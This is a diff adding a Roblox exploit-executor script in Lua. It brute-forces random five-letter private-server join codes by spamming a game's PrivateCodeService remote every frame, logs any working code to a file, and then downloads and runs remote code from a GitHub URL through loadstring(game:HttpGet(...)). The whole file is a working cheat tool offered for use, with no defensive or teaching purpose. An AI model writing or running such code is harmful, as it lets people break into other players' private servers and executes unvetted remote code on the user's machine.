@@ -1,0 +1,66 @@
+--selene:allow(undefined_variable)
+local isfile, writefile, readfile, delfile = isfile, writefile, readfile, delfile
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+if TeleportService:GetTeleportSetting("farming") then
+	local session = isfile("farmSession") and readfile("farmSession")
+	if session then
+		session = HttpService:JSONDecode(session)
+		print(`teleport took {DateTime.now().UnixTimestamp - session.timestamp}s`)
+
+		if session.dest == "menu" then
+			--selene:allow(shadowing)
+			local fileName = "FoundPS.txt"
+			local alphabet = string.split("ABCDEFGHIJKLMNOPQRSTUVWXYZ", "")
+			local remote = game:GetService("ReplicatedStorage")
+				:WaitForChild("ReplicatedModules")
+				:WaitForChild("KnitPackage")
+				:WaitForChild("Knit")
+				:WaitForChild("Services")
+				:WaitForChild("PrivateCodeService")
+				:WaitForChild("RF")
+				:WaitForChild("Invoke")
+			print("started")
+			local function getcode()
+				local code = ""
+				for _ = 1, 5 do
+					code = code .. alphabet[math.random(1, 26)]
+				end
+				return code
+			end
+			local found = false
+			local conn
+			conn = game:GetService("RunService").Heartbeat:Connect(function()
+				task.spawn(function()
+					local code = getcode()
+					local success, result = pcall(remote.InvokeServer, remote, "JoinCode", { Code = code })
+					if success then
+						if result == "Success" then
+							if not found then
+								found = true
+								local file = isfile(fileName) and readfile(fileName)
+								writefile(fileName, (file or "") .. code .. "\n")
+								conn:Disconnect()
+								print(result, code)
+
+								session.timestamp = DateTime.now().UnixTimestamp
+								session.dest = "game"
+								writefile("farmSession", HttpService:JSONEncode(session))
+							end
+						end
+					end
+				end)
+			end)
+			return
+		elseif session.dest == "game" then
+			print("success")
+			_G.farmConfig = session.config
+			--selene:allow(incorrect_standard_library_use)
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/NOTNONG/farmy/main/source"))()
+		end
+	end
+
+	TeleportService:SetTeleportSetting("farming", false)
+	delfile("farmSession")
+end
